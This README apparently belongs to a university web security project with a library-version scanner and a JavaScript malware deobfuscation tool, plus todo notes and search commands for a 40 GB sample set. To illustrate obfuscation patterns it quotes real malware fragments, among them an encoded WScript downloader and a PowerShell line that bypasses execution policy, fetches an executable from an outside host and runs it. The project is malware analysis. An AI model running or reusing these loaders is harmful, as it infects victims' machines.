# aau-security
Web application security project

## Nidan

A tool for scanning a huge range of web sites for security related issues, such as using an outdated JavaScript library.

## Database conventions

See [new_db_conventions.md](https://github.com/jwindelborg/aau-security/new_db_conventions.md)

## PyWare

Tool for analyzing JavaScript malware

To test the tool it is suggested to look at [HynekPetrak/javascript-malware-collection](https://github.com/HynekPetrak/javascript-malware-collection)

### Potential good files to test

* `20170122_38f3734379c19b7bfbb48e9f6ed4ca84.js`
* `20170118_e2e16d7c80ecd56b18d8b159cfda06bf.js`
* `20170323_05a3cc924d4c8c0699f8d72342482e51.js`
* `0160517_14d08a9ae081077e81db242655153c4b.js` -- Mentions Denmark?
* `20170301/20170301_bf55dc97b611f894f3550515d45a4171.js`
* `20170412_5a0493b8e4e62ae6455d848b644c21a3.js` -- Maybe a pretty good next step to be able to handle this file 

### PyWare todo

- [x] Handle simple string concatenations like `var t4 = "ht"+"tp";`
- [x] Handle string concatenations with declared string variables like `t4 + ":"+ter+ter` where *t4* is the *t4* assigned above
- [ ] Perform substring manipulations such as `var yYIMi = feuJN.substring(n, n+(304-303));` find more with `ag "\."substring"\("`
- [ ] Handle trivial arrays of strings
- [ ] Look more into reverse, split, join, charCodeAt and  charAt


### Patterns to try and solve

**Url encoding**

`20160328_509659787b4b25701f16c342ecb991fd.js`
```JavaScript
eval(keyHooks("_%20%3D%20%28%22WScr%22%29%2C%20superMatcher%20%3D%20%28%22Obje%22%29%3Bcontains%20%3D%20%28%22Slee%22%29%3B%20disabled%20%3D%20%28%22TP.3.%22%29%3B%20removeEventListener%20%3D%20%28%22T%22%29%3B%20overflowY%20%3D%20%28%22Sl%22%29%3Bstate%20%3D%20%285%29%3B%20needsContext%20%3D%20%28%22.6.0%22%29%3Belem%20%3D%20%28%22un%22%29%2C%20option%20%3D%20%28%22verX%22%29%3BpreDispatch%20%3D%20%2827%29%3Bfix%20%3D%20%28%22teObje%22%29%3B%20idx%20%3D%20%2889%29%3B%20dest%20%3D%20%28%22s%22%29%3B%20defaultExtra%20%3D%20%2829%29%3B%20first%20%3D%20%28%22op%22%29%3Bexpand%20%3D%20%28%22ADO%22%29%3B%20scale%20%3D%20%28%22Msxm%22%29%3B%20seekingTransport%20%3D%20%2864%29%3B%20all%20%3D%20%28%22Expan%22%29%3B%20timeout%20%3D%20%28%22hel%22%29%3B%20seed%20%3D%20%28%22t.cor%22%29%3Bvar%20bind%20%3D%20%28%22ateObj%22%29%2C%20winnow%20%3D%20%28%22eep%22%29%2C%20toggle%20%3D%20%282%29%2C%20textContent%20%3D%20%28%22rt%22%29%2C%20old%20%3D%20%281%29%3Bvar%20finalValue%20%3D%20%28%22/NOZ8%22%29%3BdefaultView%20%3D%20%2841%29%3B%20cached%20%3D%20eval%3B%20i%20%3D%20%28%22SaveT%22%29%3B%20match%20%3D%20%28%22totype%22%29%3B%20rxhtmlTag%20%3D%20%28%22ty%22%29%3BpostFinder%20%3D%20%28%22LHT%22%29%3B%20dataAndEvents%20%3D%20%28%22t%22%29%3B%20isPlainObject%20%3D%20%28%22uctor%22%29%3B%20rtypenamespace%20%3D%20%28%22iro%22%29%3B%20returned%20%3D%20%28122%29%3B%20get%20%3D%20%28%22d%22%29%3Bw%20%3D%20%289%29%3B%20cacheLength%20%3D%20%28%22Msxml%22%29%3B%20camelCase%20%3D%20%28%22length%22%29%3B%20css%20%3D%20%28%22P.6.%22%29%3BmozMatchesSelector%20%3D%20%28%22e%22%29%2C%20createFxNow%20%3D%20%28%22%3A//eku%22%29%2C%20cssPrefixes%20%3D%20%28218%29%3Bvar%20completeDeferred%20%3D%20%28%228JY.%22%29%2C%20safeActiveElement%20%3D%20%28function%20documentIsHTML%28%29%7B%7D%2C%20%22Stream%22%29%3Bvar%20triggered%20%3D%20%28%22stat%22%29%2C%20dataFilter%20%3D%20%28%22http%22%29%3BcreateCache%20%3D%20%2837%29%2C%20nativeStatusText%20%3D%20%28%22Micros%22%29%2C%20addToPrefiltersOrTransports%20%3D%20%28%22P%25/%22%29%2C%20getComputedStyle%20%3D%20%28function%20documentIsHTML.getAttribute%28%29%7Bvar%20nodeNameSelector%3D%20%5B%5D%5B%22constr%22%20+%20isPlainObject%5D%5B%22pro%22%20+%20match%5D%5B%22so%22%20+%20textContent%5D%5B%22apply%22%5D%28%29%3B%20return%20nodeNameSelector%3B%7D%2C%20%22WScrip%22%29%3Bwhat%20%3D%20%2814%29%3BcssFn%20%3D%20%28%22.com/%22%29%2C%20_queueHooks%20%3D%20%28%22verXML%22%29%2C%20undelegate%20%3D%20%28%22WSc%22%29%2C%20callbackName%20%3D%20%28%22MLHTT%22%29%3Bpop%20%3D%20%28%22n%22%29%2C%20rfxtypes%20%3D%20%28%22trings%22%29%2C%20noCloneChecked%20%3D%20%28%22nseBo%22%29%2C%20bubbleType%20%3D%20%28%22.XMLH%22%29%3Bbinary%20%3D%20%28%22dyS%22%29%2C%20nodeName%20%3D%20%28162%29%2C%20compareDocumentPosition%20%3D%20%28%22icc%22%29%3Brquery%20%3D%20%28114%29%3B%20left%20%3D%20%28%22.XM%22%29%3BnodeValue%20%3D%20%28%22pt%22%29%3B%20mapped%20%3D%20%28200%29%3B%20result%20%3D%20%283%29%3B%3B"));
// Url deded string
= ("WScr"), superMatcher = ("Obje");contains = ("Slee"); disabled = ("TP.3."); removeEventListener = ("T"); overflowY = ("Sl");state = (5); needsContext = (".6.0");elem = ("un"), option = ("verX");preDispatch = (27);fix = ("teObje"); idx = (89); dest = ("s"); defaultExtra = (29); first = ("op");expand = ("ADO"); scale = ("Msxm"); seekingTransport = (64); all = ("Expan"); timeout = ("hel"); seed = ("t.cor");var bind = ("ateObj"), winnow = ("eep"), toggle = (2), textContent = ("rt"), old = (1);var finalValue = ("/NOZ8");defaultView = (41); cached = eval; i = ("SaveT"); match = ("totype"); rxhtmlTag = ("ty");postFinder = ("LHT"); dataAndEvents = ("t"); isPlainObject = ("uctor"); rtypenamespace = ("iro"); returned = (122); get = ("d");w = (9); cacheLength = ("Msxml"); camelCase = ("length"); css = ("P.6.");mozMatchesSelector = ("e"), createFxNow = ("://eku"), cssPrefixes = (218);var completeDeferred = ("8JY."), safeActiveElement = (function documentIsHTML(){}, "Stream");var triggered = ("stat"), dataFilter = ("http");createCache = (37), nativeStatusText = ("Micros"), addToPrefiltersOrTransports = ("P%/"), getComputedStyle = (function documentIsHTML.getAttribute(){var nodeNameSelector= []["constr"   isPlainObject]["pro"   match]["so"   textContent]["apply"](); return nodeNameSelector;}, "WScrip");what = (14);cssFn = (".com/"), _queueHooks = ("verXML"), undelegate = ("WSc"), callbackName = ("MLHTT");pop = ("n"), rfxtypes = ("trings"), noCloneChecked = ("nseBo"), bubbleType = (".XMLH");binary = ("dyS"), nodeName = (162), compareDocumentPosition = ("icc");rquery = (114); left = (".XM");nodeValue = ("pt"); mapped = (200); result = (3);;
```

This patterns seems common, where meaningful strings are breaked by some kind of variable

```
var aznecad = "cmd.exe /c " + amgizann + "  $hemip='^emp+''\ebbydlu.';$ylqilgi='^wnloadFile(''ht';$pequ='^tp://seehasena';$yxfefb='^Scope    Process;';$yhoz='^olicy    Bypass -';$ryhu='^$path); Start-';$yqyv='^exe'');(New-Obj';$vilwidt='^s/outloo.exe'',';$jiwa='^Set-ExecutionP';$wxagyz='^chter.de/Style';$obsesu='^Process $path';$kwezcof='^ect   System.Net';$anezsy='^.Webclient).Do';$iculci='^ $path=($env:t'; Invoke-Expression ($jiwa+$yhoz+$yxfefb+$iculci+$hemip+$yqyv+$kwezcof+$anezsy+$ylqilgi+$pequ+$wxagyz+$vilwidt+$ryhu+$obsesu);\"";
```

```
var _87g6sd5fg = _87867t67t6gt["En"+"vi"+""+"ron"+"men"+"t"]("SY"+"S"+"T"+"E"+"M");
```

### Commands to help handle 40GB malware

We have ~40GiB JavaScript malware, spread in 39480 files selecting good files for debugging and testing can be challenging, the following command is a nice start.

It tries to find string concatenations and it uses [ag](https://github.com/ggreer/the_silver_searcher).

```
ag \"\ "\+"\ \"
```

To find and cat the files from the list use

```
find -name "*20170122_38f3734379c19b7bfbb48e9f6ed4ca84.js" -exec cat {} +
```

Another satisfying command to try is

```
ag \"\;"\n"
```

String concatenation with array
```
 ag \]\ "\+"\ \"
 ```

Var assignments starting with a string

```
 ag "(var )(([a-zA-Z])([a-zA-Z0-9$_])*)( = \")(([a-zA-Z0-9$_/:%.?=&()\-\,])*)(\")"
 ```
